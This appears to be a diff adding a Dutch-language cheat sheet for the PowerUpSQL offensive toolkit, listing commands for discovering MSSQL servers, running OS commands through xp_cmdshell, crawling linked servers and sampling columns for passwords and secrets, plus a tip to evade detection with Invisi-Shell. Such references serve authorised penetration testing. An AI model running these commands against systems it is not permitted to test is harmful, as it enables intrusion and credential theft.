@@ -1,0 +1,47 @@
+# PowerUpSQL — MSSQL enumeratie en aanval toolkit (PowerShell)
+# Uitgebreide PowerShell module voor het vinden, enumereren en aanvallen van MSSQL servers
+#
+# === Syntax ===
+# Import-Module .\PowerUpSQL.ps1
+# <Functienaam> -Instance <server> [opties]
+#
+# === Belangrijkste functies ===
+# Get-SQLInstanceDomain       Vind MSSQL instanties via AD (SPN scan)
+# Get-SQLInstanceBroadcast    Vind MSSQL via UDP broadcast
+# Get-SQLServerInfo           Server informatie ophalen
+# Get-SQLQuery                Willekeurige SQL query uitvoeren
+# Invoke-SQLAudit             Volledige security audit
+# Invoke-SQLOSCmd             OS commando uitvoeren via xp_cmdshell
+# Get-SQLServerLink           Linked servers opsommen
+# Get-SQLServerLinkCrawl      Linked server chain crawlen
+# Get-SQLDatabase             Databases opsommen
+# Get-SQLColumnSampleData     Zoek naar gevoelige kolommen (password, credit, ssn)
+#
+# === Belangrijkste opties (per functie) ===
+# -Instance SERVER     MSSQL server (IP of hostname)
+# -Username USER       SQL login (leeg = Windows auth)
+# -Password PASS       SQL wachtwoord
+# -Query SQL           SQL query
+# -Command CMD         OS commando (voor Invoke-SQLOSCmd)
+#
+# === Voorbeelden ===
+# MSSQL servers vinden in het domein:
+Get-SQLInstanceDomain | Get-SQLServerInfo
+# Server info ophalen:
+Get-SQLServerInfo -Instance TARGET
+# SQL query uitvoeren:
+Get-SQLQuery -Instance TARGET -Query "SELECT @@version"
+# OS command execution via xp_cmdshell:
+Invoke-SQLOSCmd -Instance TARGET -Command "whoami" -RawResults
+# Volledige audit:
+Invoke-SQLAudit -Instance TARGET -Verbose
+# Linked servers opsommen:
+Get-SQLServerLink -Instance TARGET -Verbose
+# Linked server chain crawlen:
+Get-SQLServerLinkCrawl -Instance TARGET
+# Zoek naar gevoelige data:
+Get-SQLColumnSampleData -Instance TARGET -Keywords "password,secret,key" -SampleSize 5
+#
+# Tip: Laad in Invisi-Shell sessie voor stealth
+# Tip: Get-SQLInstanceDomain werkt alleen met domain user (SPN query)
+# Tip: Zie ook: man_sharpsql, mssql_xpcmdshell, mssql_linked
